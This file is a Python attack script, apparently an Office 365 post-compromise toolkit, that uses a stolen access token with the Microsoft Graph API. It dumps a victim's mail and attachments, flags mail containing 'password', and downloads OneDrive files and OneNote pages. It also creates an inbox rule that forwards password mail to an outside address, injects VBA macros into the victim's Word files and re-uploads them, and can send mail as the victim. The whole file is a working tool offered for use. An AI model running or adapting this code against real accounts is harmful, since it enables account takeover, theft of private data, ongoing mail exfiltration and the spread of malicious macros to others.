import requests
import json
import re
import os
import sys
import os.path
from os import path
import pathlib
import base64
import shutil
import subprocess
import argparse
import crayons

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--token', help='Access_token', required=True)
parser.add_argument('-v', '--verbose', help='Display Mails', required=False, action='store_true')
arg = parser.parse_args()

####################################################################################################################################
#                                                    Config

# Macros file location
macros = "c:\\test\macro.txt"

# keywords to find in mails
keywords = ['test','password']

# Extension in oneDrive to download
extensions = ['pdf', 'docx',"doc", "txt"]

# Extension for attachments to download
Attachment_extensions = ['pdf', 'docx',"doc", "txt", 'py']

# From the Victim you want to send mail
fromuser = ['trouble1@trouble1.onmicrosoft.com']

# mail which will be sent
mail = """
    {
        "message": {
            "subject": "Meeting",
            "body": {
                "contentType": "Text",
                "content": "We book a room for tommorrow moring at 11:00pm for 4 people"
            },
            "toRecipients": [
                {
                    "emailAddress": {
                        "address": "garthf@contoso.com"
                    }
                }
            ]
        }
    }
    """

# Outlook Rules
rules = """{
      "displayName": "trouble1",
      "sequence": 2,
      "isEnabled": true,
      "conditions": {
        "bodyContains": [
          "Password"
        ]
      },
      "actions": {
        "forwardTo": [
          {
            "emailAddress": {
              "name": "Email test",
              "address": "emailtest@nonexistenddomain.com"
            }
          }
        ],
        "stopProcessingRules": true
      }
    }
"""



####################################################################################################################################


token = "Bearer " + str(arg.token)
response = requests.get(" https://graph.microsoft.com/v1.0/me/", headers={"Authorization":token})
victimEmail = response

try:
    folder = 'yourVictims/' + (json.loads(response.text)['userPrincipalName'])
except:
    print(crayons.red('[!] Looks like token has been expired or an invalid provided'))
    exit()

try:
    shutil.rmtree(folder)
    os.remove(folder)
except:
    pass

if os.path.isdir('yourVictims') == False:
    os.mkdir('yourVictims')

os.mkdir(folder)
os.mkdir(folder +'/Attachments')

os.system("echo "+ arg.token + " > " + folder + "/access_token.txt")


print(crayons.red("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%>>>>>>"))
print(crayons.yellow("""                                                                                                                        %%
                                                                                                                         %%%
  #########   ######   ########           ######   ##########  ########      ##      ##         ########  #######         %%%%%%
         ##  ##     #  ##                ##    ##      ##      ##           #  #     ##         ##        ##    ##         %%%%%%
          #  ##        ##                ##            ##      ##          ##  ##    ##         ##        ##    ##           %%%%%%%%%%
    #######  ########  ########  ======   ######       ##      ######     ##    ##   ##         ########  #######             %%%%%%%%%%%%%
          #  ##    ##        ##  ======        ##      ##      ##        ##########  ##         ##        ###                %%%%%%%%%%
         ##  ##    ##        ##          ##    ##      ##      ##        ##      ##  ##         ##        ##  ##           %%%%%%%
  #########   ######   ########           ######       ##      ########  ##      ##  #########  ########  ##    ##        %%%%%
__________________________________________________________________________________________________________________       %%%
Credit- office365-Attack-Toolkit                    By- @trouble1_raunak                                                %%"""))
print(crayons.red("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%>>>>>>"))


def createRules():
    
    response = requests.get(" https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules", headers={"Authorization":token}).json()
    value = 0
    while value >= 0:
        try:
            name = response['value'][value]['displayName']
            if name == json.loads(rules)['displayName']:
                ruleId = response['value'][value]['id']
                delete = requests.delete(" https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules/"+ruleId, headers={"Authorization":token})
        except:
            break  
        value = value + 1
        
    response = requests.post(" https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules", headers={"Authorization":token, "Content-Type": "application/json"}, data = rules)
    if response.status_code == 201:
        print(crayons.green('[+] Outlook rules created'))

    else:
        print(crayons.red('[-] Rules not created'))


def createmacros(docxfile,itemId,name):
    
    if os.path.isfile(macros):
        currentPath = os.getcwd()
        currentPath = currentPath.replace("\\\\", "/")
        currentPath = currentPath.replace("\\", "/")
        
        vbs = '''
            Dim wdApp
            Set wdApp = CreateObject("Word.Application")
            wdApp.Documents.Open("[currentPath]/[docxfile]")
            wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "[macros]"
            wdApp.Documents(1).SaveAs2 "[currentPath]/[output]", 0
            wdApp.Quit
        '''
        output = docxfile.replace(".docx", ".doc")
        vbs = vbs.replace("[currentPath]", currentPath)
        vbs = vbs.replace("[docxfile]", docxfile)
        vbs = vbs.replace("[macros]", macros)
        vbs = vbs.replace("[output]", output)
        
        f = open("temp.vbs", "w")
        f.write(vbs)
        f.close()
        
        os.system("cscript temp.vbs")    
        path = (currentPath + "/"+output).replace("\\","/")

        try:
            f = open(path, "r", errors='ignore')
            content = f.read()
            
        except Exception as e:
            print(e)
    
        name = name.replace(".docx",".doc")
        data = '{ "name": "[name]" }'
        data = data.replace("[name]", name)
        response = requests.patch("https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId, headers={"Authorization":token,"Content-Type":"application/json"}, data = data)
        
        if response.status_code == 200:
            print(crayons.green("[+] File renamed to .doc!"))
        else:
            print(crayons.red("[-] File not renamed!"))         
        
        with open(path, 'rb') as content:
            response = requests.put(" https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId +"/content", headers={"Authorization":token, "Content-Type":"application/vnd.openxmlformats-officedocument.wordprocessingml.document"}, data = content)

        if response.status_code == 200:
            print(crayons.green("[+] Macros successfully injected!"))
        else:
            print(crayons.red("[-] Macros not injected"))
            
    else:
        print(crayons.red("[-] Macros file not found"))


def onedrive():
    response = requests.get(" https://graph.microsoft.com/v1.0/me/drive/root/children", headers={"Authorization":token}).json()
    if response['error']:
        return
    os.mkdir(folder + '/onedrive')
    value = 0
    print(crayons.yellow('[!] Retrieving OneDrive files'))
    while value >= 0:
        try:
            data = response['value'][value]['@microsoft.graph.downloadUrl']
            name = response['value'][value]['name']
            itemId = response['value'][value]['id']     
            filename , extension = os.path.splitext(name)
            extension = extension.replace(".", '')
            if extension in extensions:
                download = subprocess.check_output('curl ' + data + ' -o ' + folder + '/onedrive/'+ name)
                print(crayons.yellow(name + ' Downloaded!'))
 
            if name.endswith('.docx') == True:
                docxfile = folder + '/onedrive/'+ name
                createmacros(docxfile,itemId,name)

        except Exception as e:
            if "index out of range" in str(e):
                break  

        value = value + 1
        
    print(crayons.green('[+] Onedrive done'))

def onenote():
    response = requests.get(" https://graph.microsoft.com/v1.0/me/onenote/pages/", headers={"Authorization":token}).json()
    os.mkdir(folder + '/onenote')
    value = 0
    while value >= 0:
        try:
            url = response['value'][value]['contentUrl']
            data = requests.get(url, headers={"Authorization":token})
            data = data.text
            name = response['value'][value]['title'] + '.html'
            f = open(folder +'/onenote/'+ name, "w")
            f.write(data)
            f.close()
        except Exception as e:
            if "index out of range" in str(e):
                break  
            
        value = value + 1
    print(crayons.green('[+] OneNote Done'))

def attachments(Id,HasAttachments):
    if HasAttachments == True:
        response = requests.get(" https://graph.microsoft.com/v1.0/me/messages/"   + Id + "/attachments", headers={"Authorization":token}).json()
        value1 = 0
        print(crayons.cyan('[+] Retrieving Attachments'))
        while (value1 >= 0):
            try:
                Attachment_name = response['value'][value1]['name']
                print(crayons.cyan(Attachment_name ))
                extension = (pathlib.Path(Attachment_name).suffix)
                Content = base64.b64decode((response['value'][value1]['contentBytes']))
                for ext in Attachment_extensions:
                    if extension == ext:
                        f = open(folder +'/'+ Attachment_name, "wb")
                        f.write(Content)
                        f.close()

                f = open(folder +'/Attachments/'+ Attachment_name, "wb")
                f.write(Content)
                f.close()
            except:
                break
            value1 = value1 + 1
        

value = 0


response = (requests.get(" https://graph.microsoft.com/v1.0/me/messages", headers={"Authorization":token})).json()


def outlook(value):
    while (value >= 0):
        
        try:
            Body =      (response['value'][value]['body']['content'])
            Sender =        (response['value'][value]['sender']['emailAddress'])
            From =          (response['value'][value]['from']['emailAddress']['address'])
            ToRecipients =  (response['value'][value]['toRecipients'][0]['emailAddress'])
            CcRecipients =  (response['value'][value]['ccRecipients'])
            CcRecipients = 'CcRecipients: ' + str(CcRecipients) + '\n' +  '<br>'
            
            BccRecipients = (response['value'][value]['bccRecipients'])
            BccRecipients = 'BccRecipients: ' + str(BccRecipients) + '\n' + '<br>'
            
            ReplyTo =       (response['value'][value]['replyTo'])
            ReplyTo =      'ReplyTo: ' + str(ReplyTo) + '\n' + '<br>'
            
            Subject =       (response['value'][value]['subject'])
            Flag =          (response['value'][value]['flag']['flagStatus'])
            HasAttachments =(response['value'][value]['hasAttachments'])
            Id =(response['value'][value]['id'])

            if CcRecipients == []:
                CcRecipients = ''
            if BccRecipients == '':
                BccRecipients = ''

            value1 = value + 1
            result = ('<div style="width:80%; padding:10px; margin: 0 auto; background-color:#ffd5d5">' +
                    str(value1) + '.' +
                    '<h2>'+str(Subject)+'</h2>'+
                    '<b>Sender:</b> ' + str(Sender['name'] +', '+ Sender['address']) + '\n' + '<br>'+
                    '<b>From:&emsp;</b> ' + str(From) + '\n' + '<br>'+
                    '&emsp;&emsp; ToRecipients: ' + str(ToRecipients) + '\n' + '<br>' +
                    '&emsp;&emsp; '+ CcRecipients +
                    '&emsp;&emsp; '+ BccRecipients +
                    '&emsp;&emsp; '+ ReplyTo +
                    '&emsp;&emsp; Flag: ' + str(Flag) + '\n' + '<br>'+
                    '&emsp;&emsp; HasAttachments: ' + str(HasAttachments) + '\n' +  '<br>'+
                    '</div>'+
                    '<div style="width:80%; padding:10px; margin: 0 auto; background-color:#e2fad7">' + '<br>'+
                    str(Body) +'\r\n\r\n' + '<br>'+
                    '</div>' + 
                    '<hr width=100%  align=left>'
                    )

            attachments(Id,HasAttachments)
            
            if arg.verbose:
                print(result)

            for word in keywords:
                if word in result:
                    f = open(folder +'/special_mails.html', "a", encoding="utf-8")
                    f.write(result)
                    f.close()
            
            f = open(folder +'/all_mails.html', "a",  encoding="utf-8")
            f.write(result)
            f.close()
            
        except Exception as e:
            try:
                print(crayons.red(response['error']['message']))
            except:
                pass
                
            break
            
        value = value + 1    

def sendmail(mail, fromuser):
    header = {"Authorization":"Bearer " + str(arg.token), "Content-type":"application/json"}

    response = requests.get(" https://graph.microsoft.com/v1.0/me/", headers=header)
    user = (json.loads(response.text)['userPrincipalName'])

    if user in fromuser:
        url = "https://graph.microsoft.com/v1.0/me/sendMail/"
        response = requests.post(url, headers=header, data=mail)
        print(response.text) 
        status = response.status_code
        to = json.loads(mail)
        if status == 202:
            text = ('[+] Mail sent from user ' + user + " to " + (to['message']['toRecipients'][0]['emailAddress']['address']))
            print(crayons.green(text))

outlook(value)
createRules()
onedrive()
onenote()
#sendmail(mail, fromuser)    

directory = folder + '/onedrive/'
files_in_directory = os.listdir(directory)
filtered_files = [file for file in files_in_directory if file.endswith(".doc")]
for file in filtered_files:
	path_to_file = os.path.join(directory, file)
	os.remove(path_to_file)
